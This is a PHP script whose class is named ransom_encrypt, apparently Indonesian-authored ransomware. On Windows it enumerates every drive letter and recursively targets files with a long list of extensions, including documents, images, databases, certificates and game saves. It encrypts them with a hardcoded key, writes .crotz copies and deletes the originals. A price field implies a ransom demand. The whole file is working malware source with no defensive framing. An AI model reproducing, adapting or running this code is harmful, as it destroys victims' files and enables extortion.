<?php
ini_set("memory_limit", "-1");
set_time_limit(0);
error_reporting(E_ALL ^ E_WARNING); 
class ransom_encrypt{
	var $price = 360;
	var $key = "XXXXX"; // Isi Key'nya sesuai keinginan
	var $extension = array("7z", "rar", "m4a", "wma", "avi", "wmv", "csv", "d3dbsp", "sc2save", "sie", "sum", "ibank", "t13", "t12", "qdf", "gdb", "tax", "pkpass", "bc6", "bc7", "bkp", "qic", "bkf", "sidn", "sidd", "mddata", "itl", "itdb", "icxs", "hvpl", "hplg", "hkdb", "mdbackup", "syncdb", "gho", "cas", "svg", "map", "wmo", "itm", "sb", "fos", "mcgame", "vdf", "ztmp", "sis", "sid", "ncf", "menu", "layout", "dmp", "blob", "esm", "001", "vtf", "dazip", "fpk", "mlx", "kf", "iwd", "vpk", "tor", "psk", "rim", "w3x", "fsh", "ntl", "arch00", "lvl", "snx", "cfr", "ff", "vpp_pc", "lrf", "m2", "mcmeta", "vfs0", "mpqge", "kdb", "db0", "mp3", "upx", "rofl", "hkx", "bar", "upk", "das", "iwi", "litemod", "asset", "forge", "ltx", "bsa", "apk", "re4", "sav", "lbf", "slm", "bik", "epk", "rgss3a", "pak", "big", "unity3d", "wotreplay", "xxx", "desc", "py", "m3u", "flv", "js", "css", "rb", "png", "jpeg", "txt", "p7c", "p7b", "p12", "pfx", "pem", "crt", "cer", "der", "x3f", "srw", "pef", "ptx", "r3d", "rw2", "rwl", "raw", "raf", "orf", "nrw", "mrwref", "mef", "erf", "kdc", "dcr", "cr2", "crw", "bay", "sr2", "srf", "arw", "3fr", "dng", "jpeg", "jpg", "cdr", "indd", "ai", "eps", "pdf", "pdd", "psd", "dbfv", "mdf", "wb2", "rtf", "wpd", "dxg", "xf", "dwg", "pst", "accdb", "mdb", "pptm", "pptx", "ppt", "xlk", "xlsb", "xlsm", "xlsx", "xls", "wps", "docm", "docx", "doc", "odb", "odc", "odm", "odp", "ods", "odt", "sql", "zip", "tar", "tar.gz", "tgz", "biz", "ocx", "html", "htm", "bat", "3gp", "srt", "cpp");
	public function __construct(){
		if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN'){
			foreach($this->GetDrive() as $drive){
				$this->GetFile($drive,$this->key);
			}
			echo "Data Berhasil di Encrypt\n\n Get a nice day ! ^.^\n\n";
		} else {
			die("Proses Gagal !");
		}
		
	}
	public function GetDrive(){
		$letter = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
		$drive = array();
		for($x=0;$x<strlen($letter);$x++){
			if(is_dir($letter[$x].":\\")){
				$drive[] = $letter[$x].":\\";
			}
		}
		return $drive;
	}
	public function Encryption($data,$key){
		$location = file_get_contents($data);
		return base64_encode(mcrypt_encrypt(MCRYPT_RIJNDAEL_256, md5($key), $location, MCRYPT_MODE_CBC, md5(md5($key))));
	}
	public function GetFile($dir,$key){
		foreach(glob($dir . DIRECTORY_SEPARATOR . "*") as $target){
			if(!is_dir($target)){
				if($target != "." && $target != ".." && is_writable($target)){
					$ext = explode(".",$target);
					if(end($ext)!="crotz" && in_array(end($ext),$this->extension)){
						$encrypt = $this->Encryption($target,$key);
						$write = fopen($target . ".crotz", "w");
						if($write){
							fwrite($write, $encrypt);
							fclose($write);
							unlink($target);
							return $target." [OK]\n";
						} else {
							return $target." [FAILED]\n";
						}
					} else {
						return $target." [SKIPPED]\n";
					}
				}
			} else {
				$this->GetFile($target,$key);
			}
		}
	}
}	
echo "\n\n\n";
$load = new ransom_encrypt;
